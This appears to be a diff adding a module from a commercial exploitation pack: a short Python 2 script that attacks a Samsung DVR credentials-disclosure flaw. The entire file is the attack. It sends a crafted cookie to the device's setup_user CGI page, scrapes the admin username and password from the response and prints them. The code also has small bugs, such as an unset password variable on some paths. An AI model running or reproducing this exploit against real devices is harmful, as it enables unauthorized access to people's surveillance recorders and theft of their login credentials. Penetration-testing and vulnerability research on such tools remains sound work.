@@ -1,0 +1,52 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_samsung_1'
+_vendor_ = 'samsung'
+_model_  = ['DVR']
+_vuln_   = 'Credentials Disclosure Vulnerability'
+_cve_    = ''
+_ref_    = 'https://www.andreafabrizi.it/2013/08/20/Samsung-DVR-vulnerability/'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = 'http://%s:%d/cgi-bin/setup_user' % (host,port)
+    headers = {'Cookie':'DATA1=ZDJkMmQyZDI='}    
+    response = requests.get(url, headers=headers)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if 'nameUser_Name_0' in response.text:
+    print '[+] %s vulnerable\n' % host
+    m = re.search('name=\'nameUser_Id_0\' value=\'(.+)\'', response.text)
+    if m is None:
+      print '[+] Credentials not found'
+      print response.text        
+    else:
+      login = m.group(1)
+      m = re.search('name=\'nameUser_Pw_0\' value=\'(.+)\'', response.text)
+      if m is not None:
+        pwd = m.group(1)                  
+      print 'Login: %s\nPassword: %s\n'%(login,pwd)
+      print '===\n\n%s'%response.text
+  else:            
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
